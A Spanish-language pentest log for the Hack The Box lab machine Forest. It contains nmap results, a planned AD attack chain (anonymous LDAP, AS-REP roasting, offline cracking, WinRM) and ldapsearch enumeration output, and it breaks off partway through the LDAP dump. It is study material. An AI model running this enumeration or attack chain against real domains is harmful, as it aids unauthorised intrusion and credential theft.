49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127
50033/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
           Raw packets sent: 67196 (2.957MB) | Rcvd: 65535 (2.621MB)
[*] Extrayendo puertos abiertos
[*] Puertos abiertos detectados: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49681,49698,50033
[*] Lanzando escaneo de servicios
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-26 12:24 CEST
Nmap scan report for 10.129.34.129
Host is up (0.047s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-26 10:31:34Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
50033/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-04-26T03:32:23-07:00
|_clock-skew: mean: 2h26m48s, deviation: 4h02m30s, median: 6m48s
| smb2-time:
|   date: 2026-04-26T10:32:24
|_  start_date: 2026-04-26T10:24:20
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.78 seconds
[*] Resumen inicial generado en: /home/r4mon/pentest/targets/HTB/easy/FOREST/notes/00_resumen_inicial.md
[*] Siguiente paso generado en: /home/r4mon/pentest/targets/HTB/easy/FOREST/notes/01_siguiente_paso.txt
[*] Flujo inicial completado

## Conclusiones

La fase inicial de Forest queda cerrada con una clasificación clara: la máquina debe tratarse como un Controlador de Dominio Active Directory del dominio htb.local.

La superficie dominante no es web. Aunque existen servicios HTTP asociados a WinRM o Microsoft HTTPAPI, las respuestas Not Found en los puertos 5985/tcp y 47001/tcp no justifican abrir una rama web principal.

El hallazgo con más peso técnico es la exposición de servicios propios de Active Directory: DNS, Kerberos, LDAP, SMB, Global Catalog, ADWS y WinRM.

La rama principal activa pasa a ser AD / LDAP / Kerberos / SMB.

El siguiente paso único es validar si LDAP permite consultas anónimas y, en caso afirmativo, enumerar usuarios y objetos del dominio.

## Objetivo

Validar la primera vía real de enumeración sobre el dominio htb.local, partiendo de la evidencia obtenida durante el escaneo inicial.

La finalidad de esta fase es determinar si el controlador de dominio permite LDAP anonymous bind y si esta condición permite extraer usuarios, cuentas de servicio u objetos relevantes para fases posteriores.

## Hechos verificados

La máquina objetivo es Forest.

La IP objetivo observada es 10.129.34.129.

La conectividad inicial responde correctamente.

El TTL observado es 127, compatible con un sistema Windows.

Nmap identifica el sistema como Windows Server 2016 Standard 14393.

El host se identifica como FOREST.

El dominio identificado es htb.local.

El FQDN identificado es FOREST.htb.local.

El conjunto de puertos abiertos muestra un perfil claro de Controlador de Dominio:

* 53/tcp: DNS.
* 88/tcp: Kerberos.
* 135/tcp: MSRPC.
* 139/tcp: NetBIOS.
* 389/tcp: LDAP.
* 445/tcp: SMB.
* 464/tcp: Kerberos password change.
* 593/tcp: RPC over HTTP.
* 636/tcp: LDAPS.
* 3268/tcp: Global Catalog LDAP.
* 3269/tcp: Global Catalog LDAPS.
* 5985/tcp: WinRM.
* 9389/tcp: ADWS.
* 47001/tcp: Microsoft HTTPAPI.
* Puertos altos 49664-50033/tcp: servicios RPC dinámicos.

SMB informa de message signing requerido.

Los puertos 5985/tcp y 47001/tcp muestran Microsoft-HTTPAPI/2.0 con título Not Found.

El resultado de Nmap muestra clock skew, por lo que cualquier prueba posterior relacionada con Kerberos debe tener en cuenta la sincronización horaria.

## Suposiciones

El entorno corresponde a un laboratorio autorizado de Hack The Box.

La máquina debe trabajarse como un caso de Active Directory, no como una máquina web clásica.

La presencia de WinRM en 5985/tcp será relevante únicamente si se obtiene una credencial válida.

La cadena probable de trabajo será:

```text
LDAP anonymous bind
-> enumeración de usuarios y objetos del dominio
-> identificación de cuentas Kerberos sin preautenticación
-> ASREPRoasting
-> crackeo offline
-> validación de credencial
-> acceso WinRM
-> análisis de relaciones y permisos de dominio
```

Todavía no queda verificado en esta instancia:

* Que LDAP permita bind anónimo.
* Que exista la cuenta svc-alfresco.
* Que haya usuarios vulnerables a ASREPRoasting.
* Que una contraseña pueda recuperarse mediante crackeo offline.
* Que WinRM acepte credenciales válidas.

## Método

La metodología correcta en esta fase consiste en trabajar de forma progresiva y basada en evidencia.

Primero se fija la resolución local del dominio y del FQDN del controlador de dominio.

Después se valida que los nombres del dominio resuelvan correctamente hacia la IP objetivo.

A continuación se prueba LDAP anonymous bind contra la base del dominio dc=htb,dc=local.

Si LDAP permite consultas anónimas, se guarda la salida completa como evidencia y se extraen los campos útiles para la siguiente decisión técnica.

La extracción inicial debe centrarse en usuarios, cuentas de servicio, nombres principales, grupos, SPNs y flags de cuenta.

Solo si aparece evidencia suficiente se pasa a la fase Kerberos.

## Respuesta

La fase 1 queda cerrada.

El hallazgo dominante actual es el perfil de Controlador de Dominio Active Directory.

La rama principal activa es AD / LDAP / Kerberos / SMB.

Las ramas secundarias quedan así:

* WinRM: secundaria, pendiente de credenciales válidas.
* SMB: secundaria, útil para enumeración adicional si LDAP no aporta suficiente información.
* HTTPAPI: descartada como rama web principal en esta fase.

El siguiente paso único es validar LDAP anonymous bind y enumerar usuarios y objetos del dominio.

La presencia de 5985/tcp y 47001/tcp no debe desviar el análisis hacia web. En esta máquina esos puertos son más útiles como indicador de administración remota Windows que como superficie HTTP explotable.

## Comandos

```bash
cd /home/r4mon/pentest/targets/HTB/easy/FOREST
```

Este comando sitúa el trabajo en el directorio de la máquina Forest para evitar mezclar evidencias con otros laboratorios.

```bash
mkdir -p content/ad content/ldap content/users loot/ad
```

Este comando prepara una estructura mínima para guardar evidencias de Active Directory, LDAP, usuarios y posibles artefactos posteriores.

```bash
echo '10.129.34.129 forest.htb.local htb.local FOREST' | sudo tee -a /etc/hosts
```

Este comando añade resolución local para el dominio y el FQDN del controlador.

En entornos Active Directory es importante trabajar también con nombres de dominio, no solo con la IP. Herramientas relacionadas con LDAP, Kerberos o SMB pueden depender de nombres correctos para interpretar el dominio y los servicios.

```bash
getent hosts htb.local
getent hosts forest.htb.local
```

Estos comandos verifican que la resolución local funciona.

La salida esperada debe apuntar ambos nombres hacia 10.129.34.129.

```bash
ldapsearch -x -H ldap://10.129.34.129:389 -b "dc=htb,dc=local" \
  > content/ldap/ldap_anonymous_full.ldif
```

Este comando valida si LDAP permite consultas anónimas.

La opción -x fuerza autenticación simple. Al no proporcionar usuario ni contraseña, la prueba intenta realizar una consulta anónima.

La opción -H define el servidor LDAP.

La opción -b define la base de búsqueda del dominio.

La salida completa se guarda en un archivo LDIF para conservar evidencia reutilizable.

```bash
grep -Ei 'dn:|sAMAccountName|userPrincipalName|memberOf|servicePrincipalName|userAccountControl' \
  content/ldap/ldap_anonymous_full.ldif \
  | tee content/ldap/ldap_interesting_fields.txt
```

Este comando extrae campos relevantes del LDIF completo.

Los campos importantes son:

* dn: ubicación del objeto dentro del directorio.
* sAMAccountName: nombre de cuenta.
* userPrincipalName: identidad tipo usuario@dominio.
* memberOf: pertenencia a grupos.
* servicePrincipalName: posible señal para técnicas Kerberos.
* userAccountControl: flags de cuenta, útiles para detectar propiedades relevantes.

```bash
grep -i 'sAMAccountName:' content/ldap/ldap_anonymous_full.ldif \
  | awk '{print $2}' \
  | sort -u \
  | tee content/users/domain_users_raw.txt
```

Este comando genera una primera lista de cuentas del dominio.

La lista servirá como base para revisar usuarios reales, cuentas de servicio y posibles candidatos para pruebas Kerberos.

```bash
grep -Ei 'alfresco|svc|service|exchange|mailbox|systemmailbox' \
  content/ldap/ldap_interesting_fields.txt \
  | tee content/ad/service_account_hints.txt
```

Este comando busca indicios de cuentas de servicio o cuentas relacionadas con Exchange.

La búsqueda no confirma vulnerabilidad por sí misma. Solo ayuda a localizar objetos que merecen revisión prioritaria en un entorno Active Directory.

## Comprobaciones

Debe comprobarse que /etc/hosts contiene la entrada de Forest.

Debe comprobarse que htb.local resuelve hacia 10.129.34.129.

Debe comprobarse que forest.htb.local resuelve hacia 10.129.34.129.

Debe comprobarse si ldapsearch devuelve objetos del dominio.

Debe quedar guardado el archivo content/ldap/ldap_anonymous_full.ldif.

Debe quedar guardado el archivo content/ldap/ldap_interesting_fields.txt.

Debe quedar guardado el archivo content/users/domain_users_raw.txt.

Debe comprobarse si aparece svc-alfresco.

Debe comprobarse si aparecen cuentas relacionadas con Exchange.

Debe documentarse si LDAP anonymous bind queda confirmado o descartado.

## Registro didáctico

Forest se clasifica desde la fase inicial como un caso Active Directory por la combinación de servicios expuestos y por la información devuelta por Nmap.

La decisión importante en esta fase consiste en no tratar Microsoft HTTPAPI como una aplicación web principal. Los servicios HTTP observados son secundarios frente a la evidencia de dominio.

La enumeración LDAP es prioritaria porque puede revelar usuarios, grupos, cuentas de servicio y atributos de cuenta sin necesidad inicial de credenciales.

La salida de LDAP no debe interpretarse como explotación. Es una fase de enumeración orientada a decidir si existen cuentas o configuraciones que abran una vía posterior.

El criterio de avance es claro: si LDAP anonymous bind funciona y aparecen usuarios del dominio, la siguiente fase será analizar candidatos Kerberos, especialmente cuentas sin preautenticación.

## Ejecución:

 mkdir -p content/ad content/ldap content/users loot/ad
❯ sudo echo '10.129.34.129 forest.htb.local htb.local FOREST' | sudo tee -a /etc/hosts
[sudo] contraseña para r4mon:
10.129.34.129 forest.htb.local htb.local FOREST
❯ getent hosts htb.local
10.129.34.129   forest.htb.local htb.local FOREST
❯ getent hosts forest.htb.local
10.129.34.129   forest.htb.local htb.local FOREST
❯ ldapsearch -x -H ldap://10.129.34.129:389 -b "dc=htb,dc=local" \
  > content/ldap/ldap_anonymous_full.ldif
❯ grep -Ei 'dn:|sAMAccountName|userPrincipalName|memberOf|servicePrincipalName|userAccountControl' \
  content/ldap/ldap_anonymous_full.ldif \
  | tee content/ldap/ldap_interesting_fields.txt
dn: DC=htb,DC=local
dn: CN=Users,DC=htb,DC=local
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local
sAMAccountName: Allowed RODC Password Replication Group
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
sAMAccountName: Denied RODC Password Replication Group
dn: CN=Read-only Domain Controllers,CN=Users,DC=htb,DC=local
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local
sAMAccountName: Enterprise Read-only Domain Controllers
dn: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
sAMAccountName: Cloneable Domain Controllers
dn: CN=Protected Users,CN=Users,DC=htb,DC=local
sAMAccountName: Protected Users
dn: CN=Key Admins,CN=Users,DC=htb,DC=local
sAMAccountName: Key Admins
dn: CN=Enterprise Key Admins,CN=Users,DC=htb,DC=local
sAMAccountName: Enterprise Key Admins
dn: CN=DnsAdmins,CN=Users,DC=htb,DC=local
sAMAccountName: DnsAdmins
dn: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
sAMAccountName: DnsUpdateProxy
dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
userAccountControl: 546
sAMAccountName: $331000-VK4ADACQNUCA
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
msExchUserAccountControl: 0
dn: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=
userAccountControl: 514
sAMAccountName: SM_2c8eef0a09b545acb
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
msExchUserAccountControl: 2
dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=
userAccountControl: 514
sAMAccountName: SM_ca8c2ed5bdab4dc9b
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
msExchUserAccountControl: 2
dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=
userAccountControl: 514
sAMAccountName: SM_75a538d3025e4db9a
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
msExchUserAccountControl: 2
dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,
userAccountControl: 514
sAMAccountName: SM_681f53d4942840e18
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
msExchUserAccountControl: 2
dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
userAccountControl: 514
sAMAccountName: SM_1b41c9286325456bb
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
msExchUserAccountControl: 2
dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=
userAccountControl: 514
sAMAccountName: SM_9b69f1b9d2cc45549
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.loc
msExchUserAccountControl: 2
dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=
userAccountControl: 514
sAMAccountName: SM_7c96b981967141ebb
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
msExchUserAccountControl: 2
dn: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=htb,DC=
userAccountControl: 514
sAMAccountName: SM_c75ee099d0a64c91b
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
msExchUserAccountControl: 2
dn: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=htb,DC=
userAccountControl: 514
sAMAccountName: SM_1ffab36a2f5f479cb
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
msExchUserAccountControl: 2
dn: CN=Administrator,CN=Users,DC=htb,DC=local
dn: CN=Guest,CN=Users,DC=htb,DC=local
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
userAccountControl: 66082
sAMAccountName: Guest
dn: CN=DefaultAccount,CN=Users,DC=htb,DC=local
memberOf: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local
userAccountControl: 66082
sAMAccountName: DefaultAccount
dn: CN=krbtgt,CN=Users,DC=htb,DC=local
dn: CN=Domain Computers,CN=Users,DC=htb,DC=local
sAMAccountName: Domain Computers
dn: CN=Domain Controllers,CN=Users,DC=htb,DC=local
dn: CN=Schema Admins,CN=Users,DC=htb,DC=local
dn: CN=Enterprise Admins,CN=Users,DC=htb,DC=local
dn: CN=Cert Publishers,CN=Users,DC=htb,DC=local
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
sAMAccountName: Cert Publishers
dn: CN=Domain Admins,CN=Users,DC=htb,DC=local
dn: CN=Domain Users,CN=Users,DC=htb,DC=local
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
sAMAccountName: Domain Users
dn: CN=Domain Guests,CN=Users,DC=htb,DC=local
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
sAMAccountName: Domain Guests
dn: CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
sAMAccountName: Group Policy Creator Owners
dn: CN=RAS and IAS Servers,CN=Users,DC=htb,DC=local
sAMAccountName: RAS and IAS Servers
dn: CN=Computers,DC=htb,DC=local
dn: CN=EXCH01,CN=Computers,DC=htb,DC=local
memberOf: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Obje
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
memberOf: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
userAccountControl: 4096
sAMAccountName: EXCH01$
servicePrincipalName: IMAP/EXCH01
servicePrincipalName: IMAP/EXCH01.htb.local
servicePrincipalName: IMAP4/EXCH01
servicePrincipalName: IMAP4/EXCH01.htb.local
servicePrincipalName: POP/EXCH01
servicePrincipalName: POP/EXCH01.htb.local
servicePrincipalName: POP3/EXCH01
servicePrincipalName: POP3/EXCH01.htb.local
servicePrincipalName: exchangeRFR/EXCH01
servicePrincipalName: exchangeRFR/EXCH01.htb.local
servicePrincipalName: exchangeAB/EXCH01
servicePrincipalName: exchangeAB/EXCH01.htb.local
servicePrincipalName: exchangeMDB/EXCH01
servicePrincipalName: exchangeMDB/EXCH01.htb.local
servicePrincipalName: SMTP/EXCH01
servicePrincipalName: SMTP/EXCH01.htb.local
servicePrincipalName: SmtpSvc/EXCH01
servicePrincipalName: SmtpSvc/EXCH01.htb.local
servicePrincipalName: WSMAN/EXCH01
servicePrincipalName: WSMAN/EXCH01.htb.local
servicePrincipalName: RestrictedKrbHost/EXCH01
servicePrincipalName: HOST/EXCH01
servicePrincipalName: RestrictedKrbHost/EXCH01.htb.local
servicePrincipalName: HOST/EXCH01.htb.local
dn: OU=Domain Controllers,DC=htb,DC=local
dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
userAccountControl: 532480
sAMAccountName: FOREST$
servicePrincipalName: TERMSRV/FOREST
servicePrincipalName: TERMSRV/FOREST.htb.local
servicePrincipalName: exchangeAB/FOREST
servicePrincipalName: exchangeAB/FOREST.htb.local
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/FOREST.htb.loc
servicePrincipalName: ldap/FOREST.htb.local/ForestDnsZones.htb.local
servicePrincipalName: ldap/FOREST.htb.local/DomainDnsZones.htb.local
servicePrincipalName: DNS/FOREST.htb.local
servicePrincipalName: GC/FOREST.htb.local/htb.local
servicePrincipalName: RestrictedKrbHost/FOREST.htb.local
servicePrincipalName: RestrictedKrbHost/FOREST
servicePrincipalName: RPC/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.loca
servicePrincipalName: HOST/FOREST/HTB
servicePrincipalName: HOST/FOREST.htb.local/HTB
servicePrincipalName: HOST/FOREST
servicePrincipalName: HOST/FOREST.htb.local
servicePrincipalName: HOST/FOREST.htb.local/htb.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/236ba33a-7959-4a41-
servicePrincipalName: ldap/FOREST/HTB
servicePrincipalName: ldap/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.loc
servicePrincipalName: ldap/FOREST.htb.local/HTB
servicePrincipalName: ldap/FOREST
servicePrincipalName: ldap/FOREST.htb.local
servicePrincipalName: ldap/FOREST.htb.local/htb.local
dn: CN=RID Set,CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
dn: CN=DFSR-LocalSettings,CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
dn: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FOREST,OU=Domain Controll
dn: CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FO
dn: CN=System,DC=htb,DC=local
dn: CN=WinsockServices,CN=System,DC=htb,DC=local
dn: CN=RpcServices,CN=System,DC=htb,DC=local
dn: CN=FileLinks,CN=System,DC=htb,DC=local
dn: CN=VolumeTable,CN=FileLinks,CN=System,DC=htb,DC=local
dn: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=htb,DC=local
dn: CN=Default Domain Policy,CN=System,DC=htb,DC=local
dn: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=htb,DC=local
dn: CN=RID Manager$,CN=System,DC=htb,DC=local
dn: CN=Meetings,CN=System,DC=htb,DC=local
dn: CN=Policies,CN=System,DC=htb,DC=local
dn: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=htb,DC=
dn: CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=htb,DC=
dn: CN=MicrosoftDNS,CN=System,DC=htb,DC=local
dn: DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,DC=local
dn: DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,DC=local
dn: DC=A.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=B.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=C.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=D.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=E.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=F.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=G.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=H.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=I.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=J.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=K.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=L.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: DC=M.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
dn: CN=RAS and IAS Servers Access Check,CN=System,DC=htb,DC=local
dn: CN=File Replication Service,CN=System,DC=htb,DC=local
dn: CN=Dfs-Configuration,CN=System,DC=htb,DC=local
dn: CN=IP Security,CN=System,DC=htb,DC=local
dn: CN=ipsecPolicy{72385230-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
dn: CN=ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000},CN=IP Security,
dn: CN=ipsecNFA{72385232-70FA-11D1-864C-14A300000000},CN=IP Security,CN=System
dn: CN=ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System
dn: CN=ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17},CN=IP Security,CN=System
dn: CN=ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000},CN=IP Secu
dn: CN=ipsecFilter{7238523A-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
dn: CN=ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu
dn: CN=ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000},CN=IP Secu
dn: CN=ipsecFilter{72385235-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
dn: CN=ipsecPolicy{72385236-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
dn: CN=ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000},CN=IP Security,
dn: CN=ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System
dn: CN=ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu
dn: CN=ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
dn: CN=ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000},CN=IP Security,
dn: CN=ipsecNFA{7238523E-70FA-11D1-864C-14A300000000},CN=IP Security,CN=System
dn: CN=ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System
dn: CN=ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17},CN=IP Security,CN=System
dn: CN=ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000},CN=IP Secu
dn: CN=ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu
dn: CN=ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17},CN=IP Security,CN=System
dn: CN=DFSR-GlobalSettings,CN=System,DC=htb,DC=local
dn: CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=htb,DC=local
dn: CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=htb
dn: CN=SYSVOL Share,CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,
dn: CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=ht
dn: CN=FOREST,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=Sy
dn: CN=AdminSDHolder,CN=System,DC=htb,DC=local
dn: CN=ComPartitions,CN=System,DC=htb,DC=local
dn: CN=ComPartitionSets,CN=System,DC=htb,DC=local
dn: CN=WMIPolicy,CN=System,DC=htb,DC=local
dn: CN=DomainUpdates,CN=System,DC=htb,DC=local
dn: CN=Operations,CN=DomainUpdates,CN=System,DC=htb,DC=local
dn: CN=6E157EDF-4E72-4052-A82A-EC3F91021A22,CN=Operations,CN=DomainUpdates,CN=
dn: CN=ab402345-d3c3-455d-9ff7-40268a1099b6,CN=Operations,CN=DomainUpdates,CN=
dn: CN=bab5f54d-06c8-48de-9b87-d78b796564e4,CN=Operations,CN=DomainUpdates,CN=
dn: CN=f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5,CN=Operations,CN=DomainUpdates,CN=
dn: CN=2416c60a-fe15-4d7a-a61e-dffd5df864d3,CN=Operations,CN=DomainUpdates,CN=
dn: CN=7868d4c8-ac41-4e05-b401-776280e8e9f1,CN=Operations,CN=DomainUpdates,CN=
dn: CN=860c36ed-5241-4c62-a18b-cf6ff9994173,CN=Operations,CN=DomainUpdates,CN=
dn: CN=0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e,CN=Operations,CN=DomainUpdates,CN=
dn: CN=a86fe12a-0f62-4e2a-b271-d27f601f8182,CN=Operations,CN=DomainUpdates,CN=
dn: CN=d85c0bfd-094f-4cad-a2b5-82ac9268475d,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6ada9ff7-c9df-45c1-908e-9fef2fab008a,CN=Operations,CN=DomainUpdates,CN=
dn: CN=10b3ad2a-6883-4fa7-90fc-6377cbdc1b26,CN=Operations,CN=DomainUpdates,CN=
dn: CN=98de1d3e-6611-443b-8b4e-f4337f1ded0b,CN=Operations,CN=DomainUpdates,CN=
dn: CN=f607fd87-80cf-45e2-890b-6cf97ec0e284,CN=Operations,CN=DomainUpdates,CN=
dn: CN=9cac1f66-2167-47ad-a472-2a13251310e4,CN=Operations,CN=DomainUpdates,CN=
